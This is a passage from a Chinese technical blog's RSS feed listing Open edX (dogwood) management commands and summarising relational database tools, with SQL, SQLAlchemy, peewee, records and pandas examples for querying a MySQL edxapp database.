&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Wed, 04 May 2016 00:00:00 +0000</pubDate><guid>tag:,2016-05-04:nginx-note.html</guid><category>技术</category></item><item><title>Open edX管理命令</title><link>/open-edx-manage-command.html</link><description>&lt;h1&gt;说明&lt;/h1&gt;
&lt;p&gt;基于dogwood版本&lt;/p&gt;
&lt;h1&gt;指令&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;/edx/bin/python.edxapp /edx/bin/manage.edxapp cms   --setting=aws&lt;/li&gt;
&lt;li&gt;/edx/bin/python.edxapp /edx/bin/manage.edxapp lms   --setting=aws&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;命令列表&lt;/h1&gt;
&lt;h3&gt;lms&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[auth]
    changepassword
    createsuperuser

[certificates]
    cert_whitelist
    create_fake_cert
    fix_ungraded_certs
    gen_cert_report
    regenerate_user
    resubmit_error_certificates
    ungenerated_certs

[course_groups]
    post_cohort_membership_fix

[course_overviews]
    generate_course_overview

[course_structures]
    generate_course_structure

[courseware]
    clean_history
    clean_xml
    dump_course_ids
    dump_course_structure
    export_course
    import
    regrade_partial

[dashboard]
    git_add_course

[debug]
    dump_xml_courses

[django]
    check
    compilemessages
    createcachetable
    dbshell
    diffsettings
    dumpdata
    flush
    inspectdb
    loaddata
    makemessages
    makemigrations
    migrate
    runfcgi
    shell
    showmigrations
    sql
    sqlall
    sqlclear
    sqlcustom
    sqldropindexes
    sqlflush
    sqlindexes
    sqlmigrate
    sqlsequencereset
    squashmigrations
    startapp
    startproject
    syncdb
    testserver
    validate

[django_comment_client]
    assign_role
    assign_roles_for_course
    create_roles_for_existing
    get_discussion_link
    reload_forum_users
    seed_permissions_roles
    show_permissions

[django_nose]
    test

[django_openid_auth]
    openid_cleanup

[djcelery]
    celery
    celerybeat
    celerycam
    celeryd
    celeryd_detach
    celeryd_multi
    celerymon
    djcelerymon

[edx_proctoring]
    set_attempt_status

[edx_sga]
    sga_migrate_submissions

[edxmako]
    preprocess_assets

[instructor]
    compute_grades
    dump_grades

[mailing]
    mailchimp_id
    mailchimp_sync_announcements
    mailchimp_sync_course

[oauth2_provider]
    create_oauth2_client

[openassessment]
    create_oa_submissions
    performance_test_for_submissions
    simulate_ai_grading_error
    upload_oa_data

[sessions]
    clearsessions

[shoppingcart]
    retire_order

[simple_history]
    populate_history

[static_replace]
    clear_collectstatic_cache

[staticfiles]
    collectstatic
    findstatic
    runserver

[student]
    6002exportusers
    6002importusers
    add_to_group
    anonymized_id_mapping
    assigngroups
    cert_restriction
    change_enrollment
    create_random_users
    create_user
    emaillist
    get_grades
    set_staff
    set_superuser
    sync_user_info
    transfer_students
    userinfo

[teams]
    reindex_course_team

[third_party_auth]
    saml

[thumbnail]
    thumbnail

[user_api]
    email_opt_in_list

[verify_student]
    retry_failed_photo_verifications
    set_software_secure_status

[wiki]
    wikiviz

[xblock_django]
    ensure_indexes
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;cms&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[auth]
    changepassword
    createsuperuser

[contentstore]
    check_course
    cleanup_assets
    clone_course
    create_course
    delete_course
    delete_orphans
    edit_course_tabs
    empty_asset_trashcan
    export
    export_all_courses
    export_convert_format
    fix_not_found
    force_publish
    git_export
    import
    migrate_to_split
    populate_creators
    prompt
    reindex_course
    reindex_library
    restore_asset_from_trashcan
    utils
    xlint

[course_groups]
    post_cohort_membership_fix

[course_overviews]
    generate_course_overview

[course_structures]
    generate_course_structure

[django]
    check
    compilemessages
    createcachetable
    dbshell
    diffsettings
    dumpdata
    flush
    inspectdb
    loaddata
    makemessages
    makemigrations
    migrate
    runfcgi
    shell
    showmigrations
    sql
    sqlall
    sqlclear
    sqlcustom
    sqldropindexes
    sqlflush
    sqlindexes
    sqlmigrate
    sqlsequencereset
    squashmigrations
    startapp
    startproject
    syncdb
    testserver
    validate

[django_nose]
    test

[django_openid_auth]
    openid_cleanup

[djcelery]
    celery
    celerybeat
    celerycam
    celeryd
    celeryd_detach
    celeryd_multi
    celerymon
    djcelerymon

[edx_proctoring]
    set_attempt_status

[edx_sga]
    sga_migrate_submissions

[edxmako]
    preprocess_assets

[oauth2_provider]
    create_oauth2_client

[openassessment]
    create_oa_submissions
    performance_test_for_submissions
    simulate_ai_grading_error
    upload_oa_data

[require]
    require_init

[sessions]
    clearsessions

[simple_history]
    populate_history

[static_replace]
    clear_collectstatic_cache

[staticfiles]
    collectstatic
    findstatic
    runserver

[student]
    6002exportusers
    6002importusers
    add_to_group
    anonymized_id_mapping
    assigngroups
    cert_restriction
    change_enrollment
    create_random_users
    create_user
    emaillist
    get_grades
    set_staff
    set_superuser
    sync_user_info
    transfer_students
    userinfo

[user_api]
    email_opt_in_list

[verify_student]
    retry_failed_photo_verifications
    set_software_secure_status

[xblock_django]
    ensure_indexes
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;使用&lt;/h1&gt;
&lt;p&gt;具体的使用方法可以翻阅源码或是测试用例&lt;a href="https://github.com/edx/edx-platform/tree/named-release/dogwood.rc/cms/djangoapps/contentstore/management/commands/tests"&gt;management/commands/tests&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;demo&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;/edx/bin/manage.edxapp cms   --setting=aws export   course-v1:a+b+c  /tmp/test/a_b_c   //导出课程&lt;/li&gt;
&lt;li&gt;导出课程还是用python代码吧:&lt;code&gt;from contentstore.management.commands.export_all_courses import export_courses_to_output_path&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 03 May 2016 00:00:00 +0000</pubDate><guid>tag:,2016-05-03:open-edx-manage-command.html</guid><category>edx</category></item><item><title>关系型数据库小结</title><link>/relational-database-summary.html</link><description>&lt;p&gt;平时用ORM偏多，生疏了SQL，周末翻了一遍《SQL必知必会》，也整理了一下相关工具，做个记录&lt;/p&gt;
&lt;h1&gt;关系数据库（Relational database）&lt;/h1&gt;
&lt;p&gt;按照维基百科说法&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;表(关系Relation)是以行(属性Attribate)和列(值组Tuble)的形式组织起来的数据的集合。一个数据库包括一个或多个表 (关系Relation)。例如，可能有一个有关作者信息的名为authors的表(关系Relation)。每列(值组Tuble)都包含特定类型的信息，如作者的姓氏。每行(属性Attribate)都包含有关特定作者的所有信息：姓、名、住址等等。在关系型数据库当中一个表 (关系Relation)就是一个关系，一个关系数据库可以包含多个表(关系Relation)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;安装&lt;/h1&gt;
&lt;p&gt;开源的关系数据库中，PostgreSQL 与MySQL 最为流行。一般使用linux发行版的包管理器就能方便地安装，更多的安装方式可以参考官网&lt;/p&gt;
&lt;h1&gt;客户端&lt;/h1&gt;
&lt;p&gt;关系数据库中，我用MySQL和SQLite偏多，所以列出这两个数据库相关的工具&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.mysql.com/products/workbench/"&gt;MySQL Workbench&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/dbcli/mycli"&gt;mycli&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://mesasqlite.en.softonic.com/mac"&gt;MesaSQLite&lt;/a&gt;，本地应用首选是sqlite&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当然更经常地，我偏好在jupyter里使用sqlalchemy来连接数据库&lt;/p&gt;
&lt;h1&gt;SQL&lt;/h1&gt;
&lt;p&gt;《SQL必知必会》（第三版）里的代码:&lt;a href="https://github.com/wwj718/teach-yourself-sql.git"&gt;teach-yourself-sql&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用mycli连接数据库&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;CREATE&lt;/span&gt; &lt;span class="k"&gt;DATABASE&lt;/span&gt; &lt;span class="n"&gt;mytest&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;--创建数据库&lt;/span&gt;
&lt;span class="n"&gt;USE&lt;/span&gt; &lt;span class="n"&gt;mytest&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;--进入数据库&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mysql -u root -D mytest   &amp;lt; /tmp/teach-yourself-sql/create.txt  &lt;span class="c1"&gt;#创建新表&lt;/span&gt;
mysql -u root -D mytest   &amp;lt; /tmp/teach-yourself-sql/populate.txt  &lt;span class="c1"&gt;# 插入数据&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;SHOW&lt;/span&gt; &lt;span class="n"&gt;TABLES&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="c1"&gt;--查看表&lt;/span&gt;
&lt;span class="k"&gt;DESCRIBE&lt;/span&gt; &lt;span class="n"&gt;Customers&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  &lt;span class="c1"&gt;--显示表结构&lt;/span&gt;
&lt;span class="k"&gt;select&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="n"&gt;Customers&lt;/span&gt; &lt;span class="k"&gt;limit&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;--查看数据 &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;查询&lt;/h3&gt;
&lt;p&gt;使用pandas做实验，存为ipynb&lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/wwj718/teach-yourself-sql/blob/master/SQL.ipynb"&gt;SQL.ipynb&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;todo：用SQLAlchemy实现&lt;/p&gt;
&lt;h1&gt;SQLAlchemy&lt;/h1&gt;
&lt;p&gt;SQLAlchemy是Python社区中最广泛使用的ORM工具，底层而强大&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;SQLAlchemy的理念是，SQL数据库的量级和性能重要于对象集合；而对象集合的抽象又重要于表和行&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;连接已有数据库&lt;/h3&gt;
&lt;p&gt;一般情况下我们已经有数据库了，那么如何将既有数据库和SQLAlchemy对接呢&lt;/p&gt;
&lt;p&gt;可以利用表的反射（Table Reflection）。把它们”导入”进来即可，这时得使用&lt;code&gt;autoload&lt;/code&gt;参数。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;sqlalchemy&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;create_engine&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;MetaData&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Table&lt;/span&gt;
&lt;span class="c1"&gt;#使用mysql，需要安装mysql驱动&lt;/span&gt;
&lt;span class="c1"&gt;#brew install mysql-connector-c（mac）&lt;/span&gt;
&lt;span class="c1"&gt;#sudo apt-get install libmysqlclient-dev （ubuntu）&lt;/span&gt;
&lt;span class="c1"&gt;#pip install MySQL-python&lt;/span&gt;
&lt;span class="n"&gt;engine&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;create_engine&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mysql+mysqldb://root@edx_host/edxapp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;echo&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;metadata&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MetaData&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;engine&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;conn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;engine&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;#连接成功&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;auth_user&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;metadata&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tables&lt;/span&gt; &lt;span class="c1"&gt;#true&lt;/span&gt;
&lt;span class="n"&gt;user_table&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Table&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;auth_user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;metadata&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;autoload&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#metadata携带连接信息&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;user_table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;columns&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;#打印出字段名&lt;/span&gt;
&lt;span class="n"&gt;ins&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;user_table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;ins&lt;/span&gt; &lt;span class="c1"&gt;#查看编译的sql&lt;/span&gt;
&lt;span class="n"&gt;users&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SELECT * FROM auth_user limit 5&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#直接执行sql&lt;/span&gt;

&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sqlalchemy&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;select&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;user_table&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;参考：&lt;a href="https://segmentfault.com/a/1190000004288061"&gt;SQLAlchemy入门（一）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;基于SQLAlchemy的便利工具&lt;/h2&gt;
&lt;h4&gt;&lt;a href="https://github.com/pudo/dataset"&gt;dataset&lt;/a&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;In short, dataset makes reading and writing data in databases as simple as reading and writing JSON files.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;dataset&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mysql+mysqldb://root@edx_host/edxapp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#print(db.tables)&lt;/span&gt;
&lt;span class="n"&gt;table&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;auth_user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;table&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;columns&lt;/span&gt;
&lt;span class="c1"&gt;#result = db.query&lt;/span&gt;
&lt;span class="c1"&gt;# 导出数据 dataset.freeze(result, format=&amp;#39;json&amp;#39;, filename=&amp;#39;users.json&amp;#39;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;&lt;a href="https://github.com/kennethreitz/records"&gt;records&lt;/a&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;SQL for Humans&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;易于导出到xls或是json。records 使用了 tablib 可以导出为任何格式&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;records&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Database&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mysql+mysqldb://root@edx_host/edxapp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;rows&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;query&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;select * from auth_user limit 5&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;rows&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dataset&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;&lt;a href="https://github.com/coleifer/peewee"&gt;peewee&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;a small, expressive orm -- supports postgresql, mysql and sqlite&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;使用习惯和django orm很像&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# http://docs.peewee-orm.com/en/latest/peewee/example.html&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;peewee&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;datetime&lt;/span&gt;

&lt;span class="n"&gt;mysql_db&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MySQLDatabase&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;yunfan&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;utf8mb4&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#CREATE DATABASE `yunfan` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;  创建数据库使用utf-8 否则有编码问题&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;QiniuStore&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;course_id&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;null&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;#key是关键字&lt;/span&gt;
    &lt;span class="n"&gt;file_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;filename&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;filesize&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;#endUser = Column(String(100),nullable=True)&lt;/span&gt;
    &lt;span class="n"&gt;create_time&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;DateTimeField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Meta&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;database&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mysql_db&lt;/span&gt;
        &lt;span class="n"&gt;order_by&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-create_time&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,)&lt;/span&gt;


&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;mysql_db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;mysql_db&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create_tables&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;QiniuStore&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;pandas&lt;/h1&gt;
&lt;p&gt;pandas的DataFrame大多时候也用来容纳二维数据，像一张&lt;code&gt;表&lt;/code&gt;,所以易于与数据库打交道&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#Pandas读取Mysql数据&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;pandas&lt;/span&gt; &lt;span class="kn"&gt;as&lt;/span&gt; &lt;span class="nn"&gt;pd&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;MySQLdb&lt;/span&gt;
&lt;span class="n"&gt;mysql_cn&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MySQLdb&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3306&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;root&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;db&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;edxapp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;#df = pd.read_sql(&amp;#39;select * from auth_user limit 100;&amp;#39;, con=mysql_cn)  &lt;/span&gt;
&lt;span class="n"&gt;df&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;pd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read_sql&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;select * from auth_user limit 10;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;con&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;mysql_cn&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;mysql_cn&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Read SQL query into a DataFrame ,之后可以使用pandas的查询和绘图统计功能&lt;/p&gt;
&lt;p&gt;参考:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/u011715678/article/details/48497291"&gt;利用Python 的 Pandas进行数据分析&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://pandas.pydata.org/pandas-docs/stable/comparison_with_sql.html"&gt;comparison_with_sql&lt;/a&gt;: pd与sql比较&lt;/li&gt;
&lt;/ul&gt;
